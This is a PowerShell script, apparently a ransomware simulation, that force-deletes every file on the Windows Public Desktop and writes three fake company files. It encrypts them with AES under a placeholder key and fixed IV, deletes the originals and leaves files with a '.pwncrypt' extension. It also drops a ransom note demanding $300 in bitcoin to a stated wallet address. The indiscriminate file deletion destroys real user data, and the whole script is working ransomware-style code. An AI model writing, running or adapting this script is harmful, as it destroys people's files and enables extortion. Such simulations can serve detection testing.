  # Define the Public Desktop path
$publicDesktop = "C:\Users\Public\Desktop"

# Define encryption key and IV (Initialization Vector) for AES
# Key should be 16, 24, or 32 bytes long for AES
$key = [System.Text.Encoding]::UTF8.GetBytes("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx") # 32 characters for AES-256
$iv = [byte[]](1..16) # IV should be 16 bytes for AES

# Function to encrypt text using AES
function Encrypt-Text($plainText, $key, $iv) {
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.IV = $iv
    $encryptor = $aes.CreateEncryptor($aes.Key, $aes.IV)

    $plainTextBytes = [System.Text.Encoding]::UTF8.GetBytes($plainText)
    $encryptedBytes = $encryptor.TransformFinalBlock($plainTextBytes, 0, $plainTextBytes.Length)

    $aes.Dispose()
    return $encryptedBytes
}

# Fake company information (You can adjust these as needed)
$fakeFiles = @{
    "EmployeeRecords.txt" = "John Doe, ID: 12345, Role: Manager`nJane Smith, ID: 54321, Role: Engineer";
    "ProjectList.txt"     = "Project X - Deadline: 2024-12-31`nProject Y - Deadline: 2024-10-15";
    "CompanyFinancials.txt" = "Total Revenue: $10,000,000`nNet Profit: $1,000,000"
}

# Define the folder path
$folderPath = "C:\Users\Public\Desktop"

# Get all files in the folder
Get-ChildItem -Path $folderPath -File | ForEach-Object {
    # Remove each file
    Remove-Item $_.FullName -Force
}

# Create fake text files, encrypt them, then delete the originals
foreach ($file in $fakeFiles.Keys) {
    $filePath = Join-Path $publicDesktop $file

    # Write the fake company information to the text file
    $fakeContent = $fakeFiles[$file]
    Set-Content -Path $filePath -Value $fakeContent

    # Encrypt the file content
    $encryptedContent = Encrypt-Text $fakeContent $key $iv

    # Get the current time
    $epochTime = [int][double]::Parse((Get-Date -UFormat %s))

    # Define the path for the encrypted file with .pwncrypt extension
    $encryptedFilePath = [System.IO.Path]::ChangeExtension($filePath, "$($epochTime).txt.pwncrypt")

    # Write the encrypted content to the new file
    [System.IO.File]::WriteAllBytes($encryptedFilePath, $encryptedContent)

    # Delete the original unencrypted file
    Remove-Item -Path $filePath
}

"Your files have been encrypted.`nTo get the decryption key, send `$300 worth of bitcoin to 14ZuDWhFL9mZUfZpsibLA2dysojP9fCFW1" | Out-File -FilePath "$($publicDesktop)\decryption-instructions.txt" -Force 
